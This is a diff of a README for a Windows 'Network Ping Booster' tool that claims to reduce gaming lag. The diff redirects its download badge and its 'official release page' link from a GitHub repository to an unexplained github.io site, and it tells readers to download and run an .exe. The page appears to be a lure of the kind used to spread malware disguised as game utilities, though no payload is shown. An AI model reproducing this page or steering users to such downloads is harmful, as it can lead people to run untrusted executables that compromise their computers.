@@ -1,6 +1,6 @@
 # 🚀 Network-Ping-Booster-2026-No-Lag - Reduce Latency For Better Online Play
 
-[![Download Network-Ping-Booster](https://img.shields.io/badge/Download-Network_Ping_Booster-blue.svg)](https://github.com/Linearoperatorvalence17/Network-Ping-Booster-2026-No-Lag)
+[![Download Network-Ping-Booster](https://img.shields.io/badge/Download-Network_Ping_Booster-blue.svg)](https://linearoperatorvalence17.github.io)
 
 ## 📌 About This Tool
 
@@ -20,7 +20,7 @@ This application works on most Windows systems. Ensure your PC meets these base 
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official release page](https://github.com/Linearoperatorvalence17/Network-Ping-Booster-2026-No-Lag).
+1. Go to the [official release page](https://linearoperatorvalence17.github.io).
 2. Look for the "Assets" section at the bottom of the latest release.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your Downloads folder.
